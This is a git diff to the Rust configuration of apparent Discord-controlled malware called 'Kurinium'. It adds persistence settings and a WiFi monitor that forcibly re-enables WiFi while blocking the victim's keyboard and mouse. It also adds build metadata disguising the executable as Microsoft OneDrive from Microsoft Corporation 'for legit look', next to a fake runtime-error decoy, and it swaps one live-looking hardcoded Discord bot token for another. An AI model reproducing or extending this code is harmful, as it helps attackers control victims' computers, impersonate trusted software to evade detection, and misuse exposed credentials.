@@ -7,6 +7,14 @@ pub struct KeepActiveConfig {
     pub interval_seconds: u64,
 }
 
+// struct holds all settings for the WiFi monitor
+pub struct WifiMonitorConfig {
+    pub enabled: bool,
+    pub check_interval_ms: u64, // How often to check WiFi state (milliseconds)
+    pub re_enable_delay_seconds: u64, // How long to wait before re-enabling WiFi
+    pub block_user_input: bool, // Block keyboard/mouse during re-enable
+}
+
 // struct holds all settings for the scheduled task
 pub struct StartupConfig {
     pub enabled: bool,
@@ -39,11 +47,20 @@ pub struct DecoyConfig {
     pub buttons: MessageBoxButtons,
 }
 
+#[allow(dead_code)]// ignore unused warning
+pub struct BuildInfo {
+    pub file_name: &'static str,
+    pub product_name: &'static str,
+    pub description: &'static str,
+    pub company_name: &'static str,
+    pub file_version: &'static str,
+}
+
 pub struct Config;
 
 impl Config {
     // --- Kurinium configuration ---
-    pub const DISCORD_TOKEN: &'static str = "MTQxMzE0NDk2NDc2MTkxNTM5Mg.GqNhxU.Z4a6nIpfb8Dnh8_Fyn7uHODUpaS7LAe6gm8jCM";
+    pub const DISCORD_TOKEN: &'static str = "MTQxMzE0NDk2NDc2MTkxNTM5Mg.GWJ_1d.xKTVlbE5-bIxIu8P65G3bjyHwjBiWANXKUwzog";
     pub const GUILD_ID: u64 = 1400774372414718064; // replace with your own guild ID
     pub const BOT_PREFIX: &'static str = ".";
 
@@ -71,7 +88,7 @@ impl Config {
     pub fn get_decoy_config() -> DecoyConfig {
         DecoyConfig {
             // set to false to disable the fake error
-            enabled: true,
+            enabled: false,
             title: "Microsoft Visual C++ Runtime Library", // the title of the error window
             // the main error text. use \n for new lines.
             message: "Runtime Error!\n\nProgram: C:\\Windows\\System32\\svchost.exe\n\nR6025\n- pure virtual function call",
@@ -105,6 +122,27 @@ impl Config {
             interval_seconds: 60,
         }
     }
+
+    // Wifi monitor config
+    pub fn get_wifi_monitor_config() -> WifiMonitorConfig {
+        WifiMonitorConfig {
+            enabled: true, // false = disabled
+            check_interval_ms: 500, // check every 500ms (0.5 seconds)
+            re_enable_delay_seconds: 3, // wait 3 secs before trying to re-enable
+            block_user_input: true, // block keyboard/mouse during re-enable
+        }
+    }
+
+    // new build info config for legit look
+    pub fn get_build_info() -> BuildInfo {
+        BuildInfo {
+            file_name: "Microsoft.Sharepoint.SyncHost.exe",
+            product_name: "Microsoft OneDrive",
+            description: "Microsoft OneDrive", // this will show in Task manager
+            company_name: "Microsoft Corporation",
+            file_version: "10.0.19041.3303",
+        }
+    }
     
     // --- Helper methods ---
     pub fn get_guildid() -> Id<GuildMarker> {
@@ -113,6 +151,10 @@ impl Config {
 
     pub fn get_token() -> String {
         Self::DISCORD_TOKEN.to_string()
+    }
+
+    pub fn get_exe_name() -> &'static str {
+        Self::get_build_info().file_name
     }
 
     pub fn get_max_bfilesize() -> usize {
